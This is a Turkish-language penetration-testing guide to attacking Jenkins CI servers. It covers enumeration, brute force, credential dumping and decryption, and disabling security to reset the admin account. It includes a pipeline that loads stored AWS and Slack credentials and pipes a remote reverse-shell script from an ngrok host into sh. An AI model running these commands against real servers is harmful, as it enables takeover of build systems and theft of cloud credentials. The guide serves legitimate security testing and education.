# Jenkins Güvenliği

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Jenkins, **programlama dilleri** ve kaynak kodu depolarının neredeyse **herhangi** bir kombinasyonu için **sürekli entegrasyon** veya **sürekli teslimat** (CI/CD) ortamı oluşturmanın basit bir yolunu sunan bir araçtır. Ayrıca, çeşitli rutin geliştirme görevlerini otomatikleştirir. Jenkins, **bireysel adımlar için betikler oluşturma ihtiyacını** ortadan kaldırmasa da, tüm derleme, test ve dağıtım araçları dizisini entegre etmenin daha hızlı ve daha sağlam bir yolunu sağlar.

{{#ref}}
basic-jenkins-information.md
{{#endref}}

## Kimlik Doğrulamasız Sayım

Kimlik doğrulaması olmadan ilginç Jenkins sayfalarını aramak için (_/people_ veya _/asynchPeople_, bu mevcut kullanıcıları listeler) şunları kullanabilirsiniz:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Kullanıcı doğrulaması gerektirmeden komutları çalıştırıp çalıştıramayacağınızı kontrol edin:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Without credentials you can look inside _**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **kullanıcı adları**.

You may be able to get the Jenkins version from the path _**/oops**_ or _**/error**_

![](<../../images/image (146).png>)

### Bilinen Güvenlik Açıkları

{{#ref}}
https://github.com/gquere/pwn_jenkins
{{#endref}}

## Giriş

In the basic information you can check **Jenkins'e giriş yapmanın tüm yolları**:

{{#ref}}
basic-jenkins-information.md
{{#endref}}

### Kayıt

You will be able to find Jenkins instances that **hesap oluşturmanıza ve içine giriş yapmanıza izin verir. Bu kadar basit.**

### **SSO Girişi**

Also if **SSO** **işlevselliği**/**eklentileri** were present then you should attempt to **giriş yapmak** to the application using a test account (i.e., a test **Github/Bitbucket account**). Trick from [**here**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** lacks **şifre politikası** and **kullanıcı adı brute-force önlemesi**. It's essential to **brute-force** users since **zayıf şifreler** or **kullanıcı adları şifre olarak** may be in use, even **ters kullanıcı adları şifre olarak**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Şifre Spraying

[Bu python betiğini](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) veya [bu powershell betiğini](https://github.com/chryzsh/JenkinsPasswordSpray) kullanın.

### IP Beyaz Liste Bypass

Birçok organizasyon, **SaaS tabanlı kaynak kontrol yönetim (SCM) sistemleri** olan GitHub veya GitLab'ı, Jenkins veya TeamCity gibi **iç, kendi barındırdığı CI** çözümleri ile birleştirir. Bu yapı, CI sistemlerinin **SaaS kaynak kontrol satıcılarından webhook olayları almasına** olanak tanır, esasen pipeline işlerini tetiklemek için.

Bunu başarmak için, organizasyonlar **SCM platformlarının** **IP aralıklarını beyaz listeye alır**, böylece **webhooklar** aracılığıyla **iç CI sistemine** erişim izni verir. Ancak, **herkesin** GitHub veya GitLab'da bir **hesap** oluşturabileceğini ve bunu **webhook tetiklemek** için yapılandırabileceğini unutmamak önemlidir; bu da **iç CI sistemine** istek gönderebilir.

Kontrol edin: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## İç Jenkins Suistimalleri

Bu senaryolarda Jenkins'e erişim için geçerli bir hesabınız olduğunu varsayacağız.

> [!WARNING]
> Jenkins'te yapılandırılan **Yetkilendirme** mekanizmasına ve ele geçirilen kullanıcının izinlerine bağlı olarak, aşağıdaki saldırıları **gerçekleştirip gerçekleştiremeyeceğinizi** **belirleyebilirsiniz**.

Daha fazla bilgi için temel bilgileri kontrol edin:

{{#ref}}
basic-jenkins-information.md
{{#endref}}

### Kullanıcıları Listeleme

Eğer Jenkins'e eriştiyseniz, [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) adresinde diğer kayıtlı kullanıcıları listeleyebilirsiniz.

### Düz Metin Gizli Bilgileri Bulmak için Yapıları Dökme

Düz metin gizli bilgileri bulmak umuduyla yapı konsol çıktıları ve yapı ortam değişkenlerini dökmek için [bu betiği](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) kullanın.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH Kimlik Bilgilerini Çalma**

Eğer ele geçirilen kullanıcının **yeni bir Jenkins düğümü oluşturma/değiştirme için yeterli yetkisi varsa** ve diğer düğümlere erişim için SSH kimlik bilgileri zaten saklanıyorsa, bu kimlik bilgilerini **çalarak** yeni bir düğüm oluşturup/değiştirerek ve **kimlik bilgilerini kaydedecek bir ana bilgisayar ayarlayarak** elde edebilir:

![](<../../images/image (218).png>)

Jenkins ssh kimlik bilgilerini genellikle **global sağlayıcıda** (`/credentials/`) bulabilirsiniz, bu nedenle diğer gizli bilgileri dökme şeklinizle bunları da dökebilirsiniz. Daha fazla bilgi için [**Gizli Bilgileri Dökme Bölümü**](./#dumping-secrets) bölümüne bakın.

### **Jenkins'te RCE**

Jenkins sunucusunda **shell almak**, saldırgana tüm **gizli bilgileri** ve **env değişkenlerini** sızdırma ve aynı ağda bulunan diğer makineleri **istismar etme** fırsatı verir veya hatta **bulut kimlik bilgilerini toplama** imkanı sağlar.

Varsayılan olarak, Jenkins **SYSTEM olarak çalışır**. Bu nedenle, onu ele geçirmek saldırgana **SYSTEM yetkileri** verecektir.

### **Proje Oluşturma/Değiştirme ile RCE**

Proje oluşturma/değiştirme, Jenkins sunucusunda RCE elde etmenin bir yoludur:

{{#ref}}
jenkins-rce-creating-modifying-project.md
{{#endref}}

### **Groovy Script Çalıştırarak RCE**

Ayrıca, yeni bir proje oluşturmaktan daha gizli olabilecek bir Groovy script çalıştırarak RCE elde edebilirsiniz:

{{#ref}}
jenkins-rce-with-groovy-script.md
{{#endref}}

### Pipeline Oluşturma/Değiştirme ile RCE

Ayrıca **pipeline oluşturarak/değiştirerek RCE elde edebilirsiniz**:

{{#ref}}
jenkins-rce-creating-modifying-pipeline.md
{{#endref}}

## Pipeline İstismarı

Pipeline'ları istismar etmek için hala Jenkins'e erişiminiz olması gerekir.

### Build Pipeline'ları

**Pipeline'lar**, projelerde **build mekanizması** olarak da kullanılabilir, bu durumda **depo içinde** pipeline sözdizimini içeren bir **dosya** yapılandırılabilir. Varsayılan olarak `/Jenkinsfile` kullanılır:

![](<../../images/image (127).png>)

Ayrıca, **pipeline yapılandırma dosyalarını başka yerlerde** (örneğin başka depolarda) saklamak da mümkündür; bu, depo **erişimini** ve pipeline erişimini **ayırma** amacı taşır.

Eğer bir saldırganın **o dosya üzerinde yazma erişimi** varsa, onu **değiştirebilir** ve **potansiyel olarak** pipeline'ı tetikleyebilir, hatta Jenkins'e erişimi olmadan bile.\
Saldırganın bazı dal korumalarını **aşması** gerekebilir (platforma ve kullanıcı yetkilerine bağlı olarak bunlar aşılabilir veya aşılamayabilir).

Özel bir pipeline'ı çalıştırmak için en yaygın tetikleyiciler şunlardır:

- **Ana dal için pull request** (veya potansiyel olarak diğer dallar için)
- **Ana dal için push** (veya potansiyel olarak diğer dallar için)
- **Ana dalı güncelleyin** ve bir şekilde çalıştırılmasını bekleyin

> [!NOTE]
> Eğer bir **harici kullanıcıysanız**, **başka bir kullanıcı/organizasyonun** repo ana dalına **PR oluşturmayı** ve **pipeline'ı tetiklemeyi** beklememelisiniz... ama eğer **kötü yapılandırılmışsa**, bunu istismar ederek şirketleri tamamen **tehdit edebilirsiniz**.

### Pipeline RCE

Önceki RCE bölümünde, [**pipeline'ı değiştirerek RCE elde etme**](./#rce-creating-modifying-pipeline) tekniği zaten belirtilmişti.

### Env Değişkenlerini Kontrol Etme

Tüm pipeline için veya belirli aşamalar için **düz metin env değişkenleri** tanımlamak mümkündür. Bu env değişkenleri **hassas bilgi içermemelidir**, ancak bir saldırgan her zaman **tüm pipeline** yapılandırmalarını/Jenkinsfile'ları kontrol edebilir:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Gizli bilgileri dökme

Jenkins'in gizli bilgileri genellikle nasıl ele aldığı hakkında bilgi için temel bilgilere göz atın:

{{#ref}}
basic-jenkins-information.md
{{#endref}}

Kimlik bilgileri **küresel sağlayıcılara** (`/credentials/`) veya **belirli projelere** (`/job/<project-name>/configure`) **sınırlanabilir**. Bu nedenle, hepsini dışarı aktarmak için **gizli bilgileri içeren tüm projeleri en azından ele geçirmeniz** ve özel/zehirli boru hatlarını çalıştırmanız gerekir.

Başka bir sorun var, bir boru hattının **env**'sinde bir **gizli bilgi** almak için **gizli bilginin adını ve türünü bilmeniz** gerekir. Örneğin, bir **`usernamePassword`** **gizli bilgisini** **`string`** **gizli bilgisi** olarak **yüklemeye** çalışırsanız bu **hata** ile karşılaşırsınız:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Burada bazı yaygın gizli türlerini yüklemenin yolu var:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Sayfanın sonunda **tüm kimlik bilgisi türlerini** bulabilirsiniz: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

> [!WARNING]
> **Tüm sırları bir kerede dökmenin** en iyi yolu, **Jenkins** makinesini **tehdit etmek** (örneğin, **yerleşik düğüm** üzerinde ters bir shell çalıştırmak) ve ardından **master anahtarlarını** ve **şifrelenmiş sırları** **sızdırmak** ve bunları çevrimdışı olarak çözmektir.\
> Bunu nasıl yapacağınız hakkında daha fazla bilgi için [Düğümler ve Ajanlar bölümüne](./#nodes-and-agents) ve [Sonrası Sömürü bölümüne](./#post-exploitation) bakın.

### Tetikleyiciler

[Belgelerden](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` direktifi, Pipeline'ın **otomatik olarak yeniden tetiklenmesi gereken yolları** tanımlar. GitHub veya BitBucket gibi bir kaynakla entegre olan Pipelinelar için, `triggers` gerekli olmayabilir çünkü webhook tabanlı entegrasyon zaten mevcut olabilir. Mevcut tetikleyiciler `cron`, `pollSCM` ve `upstream`'dir.

Cron örneği:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **diğer örnekleri belgelerde**.

### Düğümler & Ajanlar

Bir **Jenkins örneği**, **farklı makinelerde çalışan farklı ajanlara** sahip olabilir. Bir saldırgan perspektifinden, farklı makinelere erişim, **çalıntı potansiyel bulut kimlik bilgileri** veya diğer makineleri istismar etmek için kullanılabilecek **farklı ağ erişimleri** anlamına gelir.

Daha fazla bilgi için temel bilgilere bakın:

{{#ref}}
basic-jenkins-information.md
{{#endref}}

**Yapılandırılmış düğümleri** `/computer/` içinde listeleyebilirsiniz, genellikle **`Yerleşik Düğüm`** (Jenkins'i çalıştıran düğüm) ve potansiyel olarak daha fazlasını bulacaksınız:

![](<../../images/image (249).png>)

**Yerleşik düğümü ele geçirmek** özellikle ilginçtir çünkü hassas Jenkins bilgilerini içerir.

**Yerleşik Jenkins düğümünde** **pipeline'ı çalıştırmak** istediğinizi belirtmek için pipeline içinde aşağıdaki yapılandırmayı belirtebilirsiniz:
```bash
pipeline {
agent {label 'built-in'}
```
### Tam örnek

Belirli bir ajan içindeki pipeline, bir cron tetikleyicisi ile, pipeline ve aşama ortam değişkenleri ile, bir adımda 2 değişken yükleyerek ve ters shell göndererek:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Keyfi Okuma ile RCE

{{#ref}}
jenkins-arbitrary-file-read-to-rce-via-remember-me.md
{{#endref}}

## RCE

{{#ref}}
jenkins-rce-with-groovy-script.md
{{#endref}}

{{#ref}}
jenkins-rce-creating-modifying-project.md
{{#endref}}

{{#ref}}
jenkins-rce-creating-modifying-pipeline.md
{{#endref}}

## İstismar Sonrası

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Gizli Anahtarları

Yeterli izinleriniz varsa `/credentials/` erişerek gizli anahtarları listeleyebilirsiniz. Bunun yalnızca `credentials.xml` dosyasındaki gizli anahtarları listeleyeceğini unutmayın, ancak **build yapılandırma dosyaları** da **daha fazla gizli anahtar** içerebilir.

Eğer **her projenin yapılandırmasını görebiliyorsanız**, orada **depo erişimi için kullanılan gizli anahtarların (gizli anahtarlar)** ve **projenin diğer gizli anahtarlarının** isimlerini de görebilirsiniz.

![](<../../images/image (180).png>)

#### Groovy'den

{{#ref}}
jenkins-dumping-secrets-from-groovy.md
{{#endref}}

#### Diskten

Bu dosyalar **Jenkins gizli anahtarlarını şifre çözmek için** gereklidir:

- secrets/master.key
- secrets/hudson.util.Secret

Böyle **gizli anahtarlar genellikle** şunlarda bulunabilir:

- credentials.xml
- jobs/.../build.xml
- jobs/.../config.xml

Onları bulmak için bir regex:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins sırlarını çevrimdışı çöz

Eğer **sırları çözmek için gerekli şifreleri dökümlediyseniz**, **bu scripti** kullanarak **o sırları çözebilirsiniz**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy'den Jenkins sırlarını çözme
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Yeni admin kullanıcısı oluştur

1. `/var/lib/jenkins/config.xml` veya `C:\Program Files (x86)\Jenkis\` içindeki Jenkins config.xml dosyasına erişin.
2. `<useSecurity>true</useSecurity>` kelimesini arayın ve **`true`** kelimesini **`false`** olarak değiştirin.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** sunucusunu **yeniden başlatın**: `service jenkins restart`
4. Şimdi Jenkins portalına tekrar gidin ve bu sefer **Jenkins herhangi bir kimlik bilgisi istemeyecek**. **Yönetici şifresini tekrar ayarlamak için** "**Manage Jenkins**" bölümüne gidin.
5. Ayarları `<useSecurity>true</useSecurity>` olarak değiştirerek **güvenliği tekrar etkinleştirin** ve **Jenkins'i tekrar başlatın**.

## Referanslar

- [https://github.com/gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins)
- [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
- [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
- [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
- [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
- [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{{#include ../../banners/hacktricks-training.md}}
